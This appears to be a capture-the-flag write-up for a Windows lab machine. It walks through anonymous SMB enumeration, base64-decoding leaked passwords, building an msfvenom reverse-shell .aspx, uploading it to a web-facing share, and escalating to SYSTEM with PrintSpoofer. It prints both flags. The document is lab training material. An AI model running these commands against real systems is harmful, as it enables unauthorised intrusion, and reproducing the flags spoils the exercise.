## Objectives
- user.txt flag
- root.txt flag

<br>

## Initial Enumeration

<br>

### Nmap Scan

Starting off with nmap:

`sudo nmap -sC -sV -p- -T4 10.10.172.197`

```

## SMB Digging

I start out looking to see what shares are available via SMB:

`smbclient -N -L //10.10.172.197`

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

**nt4wrksv** seems like a good place to start let's see what's inside:

`smbclient -N \\\\10.10.172.197\\nt4wrksv`

```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5138806 blocks available
```

Looks promising! Let's download it and take a look inside:

`get passwords.txt`

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Those look like base64 so I decode them:

`echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d`

```
Bob - !P@$$W0rD!123
```

`echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d`

```
Bill - Juw4nnaM4n420696969!$$$
```

I login with both Bob and Bill to see if anything new shows up:

`smbclient \\\\10.10.36.80\\nt4wrksv -U Bob`

`smbclient \\\\10.10.36.80\\nt4wrksv -U Bill`

But it's still just the **password.txt** file from earlier.

They also can't access anything in the **ADMIN$** or **C$** shares:

```
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Ok then. I wonder if **atexec.py** or **smbexec.py** will work:

```
[-] Unknown DCE RPC fault status code: 00000721

[-] rpc_s_access_denied
```

No and no. **psexec.py** also does not work. Time to explore the websites and see what we can find there.

<br>

## Website Digging

Looking at the website shows a default IIS page:

<br>

![](/images/relevant1.png)

<br>

I check for **robots.txt** and also run a full **gobuster** scan but can't find anything else useful on the port 80 website.

Looking at the website on port 49663 also just shows the default IIS page.

Running **gobuster** on the port 49663 website shows the following though:

`gobuster dir -u http://10.10.36.80:49663 -t 50 -r -w dir-med.txt`

```
/nt4wrksv             (Status: 200) [Size: 0]
```

Interesting. That's the same name as the SMB share we came across earlier.

Let's see if we can access the SMB share via the website. I try to point my web browser at the directory and it comes up blank, but if I try and point it at the passwords.txt file we saw in the SMB share earlier it displays!

<br>

![](/images/relevant2.png)

<br>

So we have an SMB share that's open and accessable via the web. I don't know about you but that seems like a great security practice!

Let's try and upload a reverse shell from the command line that we can then trigger through the web browser.

Since this is a Windows machine I use **msfvenom** to create a reverse **.aspx** shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY IP> LPORT=4444 -f aspx -o shell.aspx`

And then connect back over to the SMB share and upload it:

`put shell.aspx` and `dir`:

```
smb: \> dir
  .                                   D        0  Mon Feb  7 00:06:01 2022
  ..                                  D        0  Mon Feb  7 00:06:01 2022
  shell.aspx                          A     3406  Mon Feb  7 00:28:47 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
```

<br>

## Getting a shell

Now that we have our shell uploaded and in place I start a listener on my system and then navigate to the shell with my web browser. And we're in!

```
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [MY IP] from (UNKNOWN) [10.10.33.153] 49914
Microsoft Windows [Version 10.0.14393]

c:\windows\system32\inetsrv>
```

Running `whoami`:

```
iis apppool\defaultapppool
```

And a `whoami /priv`:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled

```


Running a `dir \users` shows us:

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\users

07/25/2020  01:03 PM    <DIR>          .
07/25/2020  01:03 PM    <DIR>          ..
07/25/2020  07:05 AM    <DIR>          .NET v4.5
07/25/2020  07:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  09:30 AM    <DIR>          Administrator
07/25/2020  01:03 PM    <DIR>          Bob
07/25/2020  06:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  21,052,170,240 bytes free
```

And a `dir \users\Bob\Desktop`:

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\users\Bob\Desktop

07/25/2020  01:04 PM    <DIR>          .
07/25/2020  01:04 PM    <DIR>          ..
07/25/2020  07:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,052,190,720 bytes free
```

Let's get that user flag. Running: `type \users\Bob\Desktop\user.txt`:

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

We get an access denied message when trying to access the **Administrator** folder.

<br>

## Privilege Escalation

According to the `whoami /priv` I ran earlier we have **SeImpersonatePrivilege** and I know there are some escalation methods around that. I decide to google search it and do some reasearch:

<br>

![](/images/relevant3.png)

<br>

Opening the link displayed there covers many methods for escalating privileges and the one I was able to get working was the one in the title of the link, **PrintSpoofer**.

There are both 32 and 64 bit versions for download here, and we'll need the 64 bit one:

[https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

```
PrintSpoofer64.exe 26.5 KB
```

You can check your architecture in Windows with the following command if you don't have GUI access:

`wmic os get osarchitecture`

```
c:\windows\system32\inetsrv>wmic os get osarchitecture
wmic os get osarchitecture
OSArchitecture  
64-bit
```

I then upload the **PrintSpoofer64.exe** file to the SMB share so we can retrieve it on the target system and run it in our shell.

```
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (83.9 kb/s) (average 53.8 kb/s)
smb: \> dir
  .                                   D        0  Mon Feb  7 01:14:24 2022
  ..                                  D        0  Mon Feb  7 01:14:24 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  PrintSpoofer64.exe                  A    27136  Mon Feb  7 01:14:24 2022
  shell.aspx                          A     3406  Mon Feb  7 01:10:55 2022

                7735807 blocks of size 4096. 4949954 blocks available
```

You can find the files locoated in the **inetpub\wwwroot\nt4wrksv** directory:

```
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

02/06/2022  10:14 PM    <DIR>          .
02/06/2022  10:14 PM    <DIR>          ..
07/25/2020  07:15 AM                98 passwords.txt
02/06/2022  10:14 PM            27,136 PrintSpoofer64.exe
02/06/2022  10:10 PM             3,406 shell.aspx
               3 File(s)         30,640 bytes
               2 Dir(s)  20,275,011,584 bytes free
```

I found instructions for running the **PrintSpoofer64** command here:

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

Running the command they specified did not work however.

`PrintSpoofer64.exe -i -c powershell`

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell
PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.

c:\inetpub\wwwroot\nt4wrksv>whoami
whoami
iis apppool\defaultapppool
```

I was able to get this working by using **cmd** instead of **powershell**:

`PrintSpoofer64.exe -i -c cmd`

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...

whoami
nt authority\system
```

<br>

## Finishing things up

I take a look on the administrators desktop and the final flag is sitting there:

`dir \users\administrator\desktop`

```
C:\Windows\system32>dir \users\administrator\desktop
dir \users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\users\administrator\desktop

07/25/2020  07:24 AM    <DIR>          .
07/25/2020  07:24 AM    <DIR>          ..
07/25/2020  07:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,217,847,808 bytes free
```

And to display the flag:

`type \users\administrator\desktop\root.txt`

```
C:\Windows\system32>type \users\administrator\desktop\root.txt
type \users\administrator\desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

And with that we've completed this CTF:

## Conclusion

A quick run down of what we covered in this CTF:
- Working with SMB shares
- Decoding base64 text
- Creating a .aspx shell using msfvenom
- Uploading a reverse shell to a SMB share that is web facing and then triggering the shell by accessing it through a browser
- Exploiting the **SeImpersonatePrivilege** setting with **PrintSpoofer**
